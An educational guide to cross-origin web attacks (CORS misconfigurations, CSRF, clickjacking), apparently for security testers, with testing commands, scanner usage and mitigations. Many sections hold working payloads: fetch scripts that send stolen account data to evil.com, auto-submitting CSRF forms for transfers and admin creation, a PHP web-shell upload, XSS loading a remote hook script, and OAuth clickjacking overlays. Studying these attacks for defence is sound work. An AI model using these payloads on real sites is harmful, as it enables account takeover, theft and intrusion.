# Cross-Origin Attacks - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Same-Origin Policy (SOP)](#same-origin-policy-sop)
3. [CORS Misconfigurations](#cors-misconfigurations)
4. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
5. [Clickjacking](#clickjacking)
6. [Detection Techniques](#detection-techniques)
7. [Scanning Tools](#scanning-tools)
8. [Attack Examples & Scenarios](#attack-examples--scenarios)
9. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Cross-origin attacks exploit browser security policies and their relaxation mechanisms to perform unauthorized actions or steal data across different origins. Understanding these attacks requires deep knowledge of the Same-Origin Policy and its exceptions.

**Key Concepts**:
- **Origin**: Protocol + Domain + Port (https://example.com:443)
- **Same-Origin Policy**: Security mechanism restricting cross-origin interactions
- **CORS**: Controlled relaxation of SOP
- **Credentials**: Cookies, HTTP auth, client certificates

---

## Same-Origin Policy (SOP)

### Detailed Explanation

The Same-Origin Policy is a critical browser security mechanism that restricts how documents or scripts from one origin can interact with resources from another origin.

**Origin Components**:
```
https://www.example.com:443/page
│       │   │            │
Protocol Domain      Port
```

**Same-Origin Examples**:
```
Origin A: https://example.com
Origin B: https://example.com/admin     ✓ Same origin
Origin C: https://example.com:443        ✓ Same origin (default HTTPS port)
Origin D: http://example.com             ✗ Different protocol
Origin E: https://api.example.com        ✗ Different subdomain
Origin F: https://example.com:8443       ✗ Different port
```

**What SOP Restricts**:
- Reading cross-origin HTTP responses
- Accessing cross-origin DOM
- Reading cross-origin cookies/localStorage
- Making certain cross-origin requests

**What SOP Allows**:
- Embedding cross-origin resources (images, scripts, stylesheets)
- Submitting forms to cross-origin URLs
- Making simple cross-origin requests (GET, POST with certain content types)

---

## CORS Misconfigurations

### Detailed Explanation

Cross-Origin Resource Sharing (CORS) is a mechanism that uses HTTP headers to tell browsers to allow a web application running at one origin to access selected resources from a different origin.

**CORS Headers**:
```http
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 3600
```

### Vulnerability Types

#### 1. Wildcard Origin with Credentials
```http
❌ VULNERABLE
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

Note: Browsers block this combination, but it indicates poor security understanding
```

#### 2. Reflected Origin
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com  ❌ VULNERABLE
Access-Control-Allow-Credentials: true

The server reflects any Origin header without validation
```

#### 3. Null Origin Misconfiguration
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null  ❌ VULNERABLE
Access-Control-Allow-Credentials: true

Attacker can use sandbox iframe or data: URI to send null origin
```

#### 4. Weak Origin Validation
```javascript
// Backend validation (VULNERABLE)
const origin = req.headers.origin;
if (origin.endsWith('.example.com')) {
  res.header('Access-Control-Allow-Origin', origin);
}

// Attack: Use origin like https://evil.example.com
// Or even: https://example.com.evil.com
```

#### 5. Pre-domain Matching
```javascript
// VULNERABLE: startsWith check
if (origin.startsWith('https://example.com')) {
  res.header('Access-Control-Allow-Origin', origin);
}

// Attack: https://example.com.evil.com
```

#### 6. Substring Matching
```javascript
// VULNERABLE: contains check
if (origin.includes('example.com')) {
  res.header('Access-Control-Allow-Origin', origin);
}

// Attack: https://evil.com/example.com
// Or: https://exampleXcom.evil.com (if . not checked)
```

### Detection Methods

**Manual Testing**:
```bash
# 1. Test with arbitrary origin
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# 2. Test with null origin
curl -H "Origin: null" -I https://target.com/api/user

# 3. Test with subdomain
curl -H "Origin: https://evil.target.com" -I https://target.com/api/user

# 4. Test with pre-domain
curl -H "Origin: https://target.com.evil.com" -I https://target.com/api/user

# 5. Test with modified trusted domain
curl -H "Origin: https://targetXcom" -I https://target.com/api/user

# Check response for:
# - Access-Control-Allow-Origin header
# - Access-Control-Allow-Credentials: true
```

**Burp Suite Testing**:
1. Send request to Repeater
2. Add/modify Origin header
3. Observe CORS headers in response
4. Test with credentials if CORS vulnerable

### Real-World Scenarios

**Scenario 1: API Data Exfiltration**
```javascript
// Vulnerable API: https://bank.com/api/account
// CORS: Reflects any origin + allows credentials

// Attacker's page (https://evil.com)
fetch('https://bank.com/api/account', {
  credentials: 'include'  // Include cookies
})
.then(r => r.json())
.then(data => {
  // Exfiltrate sensitive data
  fetch('https://evil.com/log', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

**Scenario 2: Null Origin Exploit**
```html
<!-- Attacker hosts this page -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://bank.com/api/sensitive', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(data => {
      parent.postMessage(data, '*');
    });
  </script>
"></iframe>

<script>
window.addEventListener('message', function(e) {
  // Send stolen data to attacker
  fetch('https://evil.com/log', {method:'POST', body: e.data});
});
</script>
```

**Scenario 3: Pre-domain Attack**
```javascript
// Vulnerable server validates: origin.startsWith('https://api.company.com')
// Attacker registers: api.company.com.evil.com

// From https://api.company.com.evil.com
fetch('https://api.company.com/admin/users', {
  credentials: 'include'
})
.then(r => r.json())
.then(users => {
  fetch('https://evil.com/stolen', {method: 'POST', body: JSON.stringify(users)});
});
```

---

## Cross-Site Request Forgery (CSRF)

### Detailed Explanation

CSRF attacks force authenticated users to execute unwanted actions on a web application where they're currently authenticated. The attack leverages the browser's automatic inclusion of credentials (cookies, HTTP auth) with cross-origin requests.

**Attack Prerequisites**:
1. User must be authenticated on target site
2. Application relies solely on cookies for authentication
3. No CSRF protections (tokens, SameSite cookies, origin validation)
4. Attacker knows request structure

**Attack Flow**:
1. Victim logs into legitimate site (bank.com)
2. Site issues session cookie
3. Victim visits attacker's site (evil.com)
4. Attacker's page triggers request to bank.com
5. Browser automatically includes bank.com cookies
6. Bank executes action thinking it's legitimate

### Vulnerability Types

#### 1. GET-based CSRF
```html
<!-- Simplest form - state-changing GET request -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Or via JavaScript -->
<script>
new Image().src = 'https://bank.com/transfer?to=attacker&amount=10000';
</script>
```

#### 2. POST-based CSRF
```html
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
```

#### 3. JSON CSRF (with CORS misconfiguration)
```html
<script>
fetch('https://api.bank.com/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
</script>

Note: Requires CORS misconfiguration to work
```

#### 4. Multi-step CSRF
```html
<!-- Attack that requires multiple requests -->
<script>
// Step 1: Get CSRF token (if token is reusable)
fetch('https://target.com/profile', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const token = doc.querySelector('[name=csrf_token]').value;

    // Step 2: Use token in attack
    fetch('https://target.com/change-email', {
      method: 'POST',
      credentials: 'include',
      body: 'email=attacker@evil.com&csrf_token=' + token
    });
  });
</script>

Note: Only works if CORS allows cross-origin reads
```

### Detection Methods

**Manual Testing**:
1. Identify state-changing requests (POST, PUT, DELETE)
2. Check if request includes CSRF token
3. Remove or modify CSRF token
4. Change Content-Type header
5. Test if request executes without token

**Burp Suite Testing**:
1. Right-click request → Engagement Tools → Generate CSRF PoC
2. Save HTML file
3. Host file on different domain
4. Test if action executes

**Automated Testing**:
```bash
# Check for CSRF tokens in forms
grep -r "csrf" target_responses.txt

# Test with modified origin
curl -X POST https://target.com/action \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VALID_SESSION" \
  -d "action=delete&id=1"
```

### Real-World Scenarios

**Scenario 1: Account Takeover**
```html
<!-- Change victim's email to attacker's email -->
<html>
<body>
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>

<!-- After email changed, attacker uses "forgot password" -->
```

**Scenario 2: Privilege Escalation**
```html
<!-- Add attacker as admin user -->
<form action="https://admin.company.com/users/add" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="role" value="admin">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Scenario 3: Financial Transaction**
```html
<!-- Transfer money -->
<img src="https://bank.com/api/transfer?to=ATT123456&amount=5000&currency=USD">

<!-- Works if:
  1. Bank uses GET for transfers (bad practice)
  2. No CSRF token required
  3. No additional authentication
-->
```

**Scenario 4: CSRF to XSS Chain**
```html
<!-- Use CSRF to inject XSS payload in victim's profile -->
<form action="https://social.com/profile/update" method="POST">
  <input type="hidden" name="bio" value="<script src=//evil.com/hook.js></script>">
</form>
<script>document.forms[0].submit();</script>

<!-- Result:
  1. Victim's bio updated with XSS
  2. XSS executes for anyone viewing victim's profile
  3. Worm potential if visitors get infected
-->
```

---

## Clickjacking

### Detailed Explanation

Clickjacking (UI redressing) tricks users into clicking something different from what they perceive, by overlaying invisible or opaque elements over legitimate UI controls.

**Attack Technique**:
1. Attacker creates malicious page
2. Embeds target site in transparent iframe
3. Positions iframe so sensitive button overlays attacker's UI
4. User clicks what appears to be attacker's button
5. Actually clicks target site's button

### Attack Variants

#### 1. Basic Clickjacking
```html
<html>
<head>
<style>
iframe {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  opacity: 0.00001;  /* Nearly invisible */
  z-index: 1000;
}
button {
  position: absolute;
  top: 300px;
  left: 500px;
  z-index: 1;
}
</style>
</head>
<body>
  <button>Click here for free iPad!</button>
  <iframe src="https://bank.com/delete-account"></iframe>
</body>
</html>
```

#### 2. Double Clickjacking
```html
<!-- Requires two clicks - bypass "Are you sure?" -->
<style>
#iframe1, #iframe2 {
  position: absolute;
  opacity: 0.00001;
}
#iframe1 { top: 100px; left: 200px; }
#iframe2 { top: 150px; left: 200px; }
</style>

<button style="position:absolute;top:100px;left:200px">Click for prize!</button>
<button style="position:absolute;top:150px;left:200px">Confirm</button>

<iframe id="iframe1" src="https://bank.com/transfer?amount=1000"></iframe>
<iframe id="iframe2" src="https://bank.com/transfer/confirm"></iframe>
```

#### 3. Drag & Drop Clickjacking
```html
<!-- Trick user into dragging sensitive data -->
<style>
iframe {
  position: absolute;
  top: 0; left: 0;
  width: 1px; height: 1px;
  opacity: 0;
}
</style>

<div draggable="true">Drag this secret recipe</div>
<iframe src="https://attacker.com/drop-zone"></iframe>

<script>
document.addEventListener('dragstart', function(e) {
  // User thinks they're dragging "recipe"
  // Actually dragging data from invisible iframe
});
</script>
```

#### 4. Touch-based Clickjacking (Mobile)
```html
<!-- Exploits touch events on mobile -->
<style>
iframe {
  position: fixed;
  top: 0;
  opacity: 0;
  width: 100%;
  height: 100%;
  z-index: 999;
}
</style>

<div style="position:fixed;z-index:1">
  <h1>Tap to play game!</h1>
  <img src="game.jpg">
</div>

<iframe src="https://bank.com/authorize-payment"></iframe>
```

### Detection Methods

**Manual Testing**:
```bash
# Check X-Frame-Options header
curl -I https://target.com | grep -i x-frame-options

# Check CSP frame-ancestors
curl -I https://target.com | grep -i content-security-policy

# Expected secure responses:
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
```

**Browser Testing**:
```html
<!-- Test if site can be framed -->
<iframe src="https://target.com"></iframe>

<!-- Open in browser:
  - If site loads: VULNERABLE
  - If blocked: Protected
  - Check console for frame-ancestors violation
-->
```

### Real-World Scenarios

**Scenario 1: OAuth Token Theft**
```html
<!-- Steal OAuth authorization -->
<style>
iframe {
  position: absolute;
  top: -300px;  /* Move authorize button to clickable area */
  left: -200px;
  opacity: 0.00001;
}
</style>

<button style="position:absolute;top:200px;left:300px">
  Click to continue
</button>

<iframe src="https://oauth-provider.com/authorize?client_id=ATTACKER_APP&..."></iframe>

<!-- User clicks "Click to continue"
     Actually clicks "Authorize" on OAuth screen
     Grants attacker access to victim's account
-->
```

**Scenario 2: Social Media Actions**
```html
<!-- Force user to like/follow/share -->
<iframe src="https://facebook.com/attacker-page" style="opacity:0;position:absolute;top:100px"></iframe>
<button style="position:absolute;top:XXXpx">Download</button>

<!-- User clicks Download, actually clicks Facebook Like -->
```

---

## Detection Techniques

### Comprehensive Testing Workflow

#### CORS Testing Checklist
- [ ] Test with arbitrary origin
- [ ] Test with null origin
- [ ] Test with subdomain variations
- [ ] Test with pre-domain attack
- [ ] Test with post-domain attack
- [ ] Test with partial domain match
- [ ] Test with uppercase/lowercase variations
- [ ] Check if credentials allowed
- [ ] Test preflight request handling
- [ ] Check allowed methods
- [ ] Check allowed headers

#### CSRF Testing Checklist
- [ ] Identify state-changing requests
- [ ] Check for CSRF tokens
- [ ] Test token validation (remove, reuse, modify)
- [ ] Test with different Content-Type
- [ ] Test with different HTTP methods
- [ ] Check Referer/Origin validation
- [ ] Test SameSite cookie attribute
- [ ] Generate CSRF PoC
- [ ] Test from different origin
- [ ] Check custom headers requirement

#### Clickjacking Testing Checklist
- [ ] Check X-Frame-Options header
- [ ] Check CSP frame-ancestors directive
- [ ] Test if site can be framed
- [ ] Test with different origins
- [ ] Check JavaScript frame-busting code
- [ ] Test on sensitive pages (delete, transfer, authorize)

---

## Scanning Tools

### 1. CORScanner
```bash
# Basic scan
python cors_scan.py -u https://target.com

# Scan multiple URLs from file
python cors_scan.py -i urls.txt

# Scan with threads
python cors_scan.py -i urls.txt -t 20

# Custom origin
python cors_scan.py -u https://target.com -o https://evil.com

# Verbose output
python cors_scan.py -u https://target.com -v

# Output to file
python cors_scan.py -i urls.txt -o results.json
```

### 2. Corsy
```bash
# Advanced CORS scanner
python corsy.py -u https://target.com

# Scan with custom headers
python corsy.py -u https://target.com -H "Authorization: Bearer TOKEN"

# Scan from file
python corsy.py -i urls.txt

# Specify delay between requests
python corsy.py -u https://target.com -d 2

# Output formats
python corsy.py -u https://target.com --json output.json
```

### 3. Burp Suite Extensions

**CORS Everywhere**:
- Automatically tests CORS configurations
- Passive and active scanning
- Reports misconfigurations

**CSurfer** (CSRF Scanner):
- Detects missing CSRF tokens
- Generates CSRF PoCs
- Tests token validation

**Clickbandit**:
- Records clickjacking attacks
- Generates PoC HTML
- Tests frame-busting bypasses

### 4. OWASP ZAP
```bash
# Command-line CORS testing
zap-cli active-scan -r https://target.com

# With authentication
zap-cli --api-key KEY active-scan https://target.com

# Passive scanning (detects missing headers)
zap-cli quick-scan https://target.com
```

### 5. Manual Tools

**curl** (CORS testing):
```bash
# Test Origin reflection
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing origin: $origin"
  curl -H "Origin: $origin" -I https://target.com/api
  echo "---"
done

# Test with credentials
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=VALID_SESSION" \
     https://target.com/api/user
```

**CSRFtester** (GUI tool):
- Intercepts requests
- Generates CSRF test cases
- Replays requests from different origin

### 6. Specialized Tools

**Bolt** (CSRF scanner):
```bash
python bolt.py -u https://target.com
python bolt.py -u https://target.com --crawl
```

**XSRFProbe**:
```bash
xsrfprobe -u https://target.com
xsrfprobe -u https://target.com --crawl
xsrfprobe -u https://target.com --display
```

**Postman/Insomnia** (Manual CORS testing):
- Modify Origin header in requests
- Observe CORS headers in responses
- Test with different credentials

---

## Attack Examples & Scenarios

### Advanced CORS Exploitation

**Scenario 1: Intranet Scanning via CORS**
```javascript
// From https://evil.com
// Target has CORS misconfiguration allowing evil.com

// Scan internal network
const internal_ips = [];
for (let i = 1; i < 255; i++) {
  fetch(`https://target.com/api/proxy?url=http://192.168.1.${i}`, {
    credentials: 'include'
  })
  .then(r => r.text())
  .then(data => {
    if (data.includes('Server')) {
      internal_ips.push(`192.168.1.${i}`);
      fetch('https://evil.com/log-ip', {method: 'POST', body: `192.168.1.${i}`});
    }
  })
  .catch(() => {});
}
```

**Scenario 2: Chain CORS + XSS**
```javascript
// 1. Exploit CORS to steal data
fetch('https://api.target.com/users', {credentials: 'include'})
  .then(r => r.json())
  .then(users => {
    // 2. Use stolen admin user ID in XSS attack
    const adminId = users.find(u => u.role === 'admin').id;

    // 3. CSRF to add XSS in admin-visible page
    fetch(`https://target.com/messages/send`, {
      method: 'POST',
      credentials: 'include',
      body: JSON.stringify({
        to: adminId,
        message: '<script src=//evil.com/hook.js></script>'
      })
    });
  });
```

### Advanced CSRF Attacks

**Scenario 1: CSRF File Upload**
```html
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="file" value="<?php system($_GET['cmd']); ?>">
  <input type="hidden" name="filename" value="shell.php">
</form>
<script>
// Create blob with malicious PHP code
const blob = new Blob(['<?php system($_GET["cmd"]); ?>'], {type: 'application/x-php'});
const formData = new FormData();
formData.append('file', blob, 'shell.php');

fetch('https://target.com/upload', {
  method: 'POST',
  credentials: 'include',
  body: formData
});
</script>
```

**Scenario 2: CSRF WebSocket Hijacking**
```html
<script>
// If WebSocket doesn't validate origin
const ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
  // Send messages as victim
  ws.send(JSON.stringify({
    action: 'broadcast',
    message: 'Visit https://evil.com for prize!'
  }));
};

ws.onmessage = function(event) {
  // Exfiltrate victim's messages
  fetch('https://evil.com/log', {
    method: 'POST',
    body: event.data
  });
};
</script>
```

---

## Prevention & Mitigation

### CORS Security

#### Proper CORS Configuration
```javascript
// Node.js/Express example
const allowedOrigins = [
  'https://app.example.com',
  'https://www.example.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;

  // Strict validation
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
  }

  next();
});
```

#### Best Practices
- Never reflect Origin header without validation
- Use whitelist of exact origins
- Avoid regex validation unless very strict
- Don't allow null origin
- Minimize use of credentials
- Implement proper authentication beyond cookies

### CSRF Protection

#### 1. Synchronizer Token Pattern
```javascript
// Backend generates token
app.get('/form', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  res.render('form', { csrfToken: token });
});

// Backend validates token
app.post('/action', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // Process request
});
```

#### 2. SameSite Cookies
```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
```

**SameSite Values**:
- `Strict`: Cookie never sent in cross-site requests
- `Lax`: Cookie sent with top-level navigation (GET)
- `None`: Cookie sent in all contexts (requires Secure)

#### 3. Custom Headers
```javascript
// Require custom header (CORS preflight will block)
fetch('/api/action', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-CSRF-Token': token
  }
});

// Backend validation
if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
  return res.status(403).send('Forbidden');
}
```

#### 4. Double Submit Cookie
```javascript
// Set CSRF token in cookie
res.cookie('csrf_token', token, { secure: true, sameSite: 'strict' });

// Client sends token in header AND cookie
fetch('/api/action', {
  headers: { 'X-CSRF-Token': getCookie('csrf_token') }
});

// Backend compares
if (req.cookies.csrf_token !== req.headers['x-csrf-token']) {
  return res.status(403).send('Invalid token');
}
```

### Clickjacking Protection

#### 1. X-Frame-Options Header
```http
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.com
```

#### 2. CSP frame-ancestors
```http
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://trusted.com
```

#### 3. JavaScript Frame-Busting (Defense in Depth)
```javascript
// Modern approach
if (window.top !== window.self) {
  window.top.location = window.self.location;
}

// With additional checks
if (window.top !== window.self) {
  if (document.referrer && !document.referrer.startsWith(window.location.origin)) {
    window.top.location = window.self.location;
  }
}
```

### Security Headers Summary
```http
# CORS
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true

# Clickjacking
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'

# CSRF (via SameSite)
Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly

# Additional
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
```

---

**Additional Resources**:
- PortSwigger Web Security Academy - CORS
- OWASP CSRF Prevention Cheat Sheet
- MDN Web Docs - CORS
- Same-Site Cookies Explained
